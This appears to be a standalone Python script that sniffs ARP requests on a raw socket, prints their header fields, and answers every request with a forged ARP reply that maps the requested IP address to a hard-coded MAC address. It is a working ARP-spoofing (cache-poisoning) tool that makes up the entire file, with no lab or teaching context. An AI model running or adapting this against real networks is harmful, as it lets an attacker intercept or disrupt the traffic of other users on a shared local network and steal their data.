import socket
import struct
import binascii

rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
# senderSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
# senderSocket.bind(('wlp1s0', socket.htons(0x0800)))

# senderSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, 0)
# senderSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
# senderSocket.bind(('wlp1s0', 0x0806))

my_MAC = b'\xe4\x42\xa6\x33\x39\xe3'

while True:

    packet = rawSocket.recvfrom(2048)

    ethernet_header = packet[0][0:14]
    ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header)

    arp_header = packet[0][14:42]
    arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)

    dest_MAC = ethernet_detailed[0]
    src_MAC = ethernet_detailed[1]
    protocol = ethernet_detailed[2]

    hw_type = arp_detailed[0]
    ptc_type = arp_detailed[1]
    hw_size = arp_detailed[2]
    ptc_size = arp_detailed[3]
    opcode = arp_detailed[4]
    src_MAC_arp = arp_detailed[5]
    src_IP = arp_detailed[6]
    dest_MAC_arp = arp_detailed[7]
    dest_IP = arp_detailed[8]

    if opcode == b'\x00\x01':


        print ("****************_ETHERNET_FRAME_****************")
        print ("Dest MAC:        ", binascii.hexlify(dest_MAC).decode('utf-8'))
        print ("Source MAC:      ", binascii.hexlify(src_MAC).decode('utf-8'))
        print ("Type:            ", binascii.hexlify(protocol).decode('utf-8'))
        print ("************************************************")
        print ("******************_ARP_HEADER_******************")
        print ("Hardware type:   ", binascii.hexlify(hw_type).decode('utf-8'))
        print ("Protocol type:   ", binascii.hexlify(ptc_type).decode('utf-8'))
        print ("Hardware size:   ", binascii.hexlify(hw_size).decode('utf-8'))
        print ("Protocol size:   ", binascii.hexlify(ptc_size).decode('utf-8'))
        print ("Opcode:          ", binascii.hexlify(opcode).decode('utf-8'))
        print ("Source MAC:      ", binascii.hexlify(src_MAC_arp).decode('utf-8'))
        print ("Source IP:       ", socket.inet_ntoa(src_IP))
        print ("Dest MAC:        ", binascii.hexlify(dest_MAC_arp).decode('utf-8'))
        print ("Dest IP:         ", socket.inet_ntoa(dest_IP))
        print ("*************************************************\n")

        # print(packet)

        eth_hdr = struct.pack("!6s6s2s", src_MAC, my_MAC, protocol)

        arp_hdr = struct.pack("2s2s1s1s2s6s4s6s4s", hw_type, ptc_type, hw_size, ptc_size, b'\x00\x02', my_MAC, dest_IP, src_MAC_arp, src_IP)

        packet2 = eth_hdr + arp_hdr
        rawSocket.sendto(packet2, packet[1])
        # rawSocket.sendto(packet2, ('wlp1s0', 0))